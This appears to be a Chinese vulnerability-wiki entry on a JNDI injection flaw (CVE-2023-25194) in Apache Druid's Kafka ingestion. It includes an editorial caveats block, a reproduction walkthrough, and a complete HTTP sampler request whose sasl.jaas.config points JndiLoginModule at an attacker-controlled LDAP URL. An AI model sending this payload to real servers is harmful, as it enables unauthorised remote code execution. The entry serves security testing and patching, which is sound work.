---
cve: "CVE-2023-25194"
version: "Apache Druid <= 25.0.0"
source: "Threekiii/Vulnerability-Wiki"
title: "Apache Druid 远程代码执行漏洞 QVD-2023-9629"
product: "Druid内嵌Kafka Clients"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2023-25194; QVD-2023-9629"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "可配置Kafka输入sasl.jaas.config、受影响客户端库、LDAP出站及JNDI执行条件，Druid<=25范围需组件核对"
affected_versions: "Apache Druid <= 25.0.0"
source_status: "unknown"
side_effects: "涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-001cfa76f2d0c5139f091807"
entity_id: "ve-001cfa76f2d0c5139f091807"
schema_version: "1"
---

# Apache Druid 远程代码执行漏洞 QVD-2023-9629

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：可配置Kafka输入sasl.jaas.config、受影响客户端库、LDAP出站及JNDI执行条件，Druid<=25范围需组件核对
- 证据范围：与51同依赖漏洞/同sampler骨架，QVD不是新增独立根因；本篇仅DNSLog不是命令执行实证

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- QVD放cnvd字段错误
- 没有提供Kafka客户端/JDK版本及补丁建议，只隔离/认证不足以修复已授权注入
- 1.1.1.1为真实公共服务地址应换保留示例
- 将Kafka Connect与Kafka Clients可控参数范围混用需精确组件标记

### 操作风险与资料使用

- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

该漏洞源于 Apache Kafka Connect JNDI 注入漏洞（CVE-2023-25194），Apache Druid 由于支持从 Kafka 加载数据，刚好满足其利用条件，攻击者可通过修改Kafka 连接配置属性进行 JNDI 注入攻击，进而在服务端执行任意恶意代码。

## 漏洞影响

```
Apache Druid <= 25.0.0
```

## 网络测绘

```
title="Apache Druid"
```

## 漏洞复现

访问漏洞环境，点击 Load data -> Streaming，进入页面后点击 Apache Kafka -> Connect data：

![image-20230801093324881](./.resource/Apache-Druid-远程代码执行漏洞-QVD-2023-9629/media/image-20230801093324881.png)


在 Bootstrap servers 和 Topic 处填入任意字符，点击 Apply，抓包。

poc：

```http
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 1437
Connection: close

{
    "type":"kafka",
    "spec":{
        "type":"kafka",
        "ioConfig":{
            "type":"kafka",
            "consumerProperties":{
                "bootstrap.servers":"1.1.1.1:9092",
                "sasl.mechanism":"SCRAM-SHA-256",
                "security.protocol":"SASL_SSL",
                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://your-ip\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
            },
            "topic":"any",
            "useEarliestOffset":true,
            "inputFormat":{
                "type":"regex",
                "pattern":"([\\s\\S]*)",
                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns":[
                    "raw"
                ]
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"!!!_no_such_column_!!!",
                "missingValue":"1970-01-01T00:00:00Z"
            },
            "dimensionsSpec":{

            },
            "granularitySpec":{
                "rollup":false
            }
        },
        "tuningConfig":{
            "type":"kafka"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}
```

修改请求包，user.provider.url 处填写你的 ldap 服务 url。

利用 DNSLog 验证漏洞是否存在。

## 修复建议

- 避免 Apache Druid 开放至公网。
- 开启身份认证机制,可参考官方文档：https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
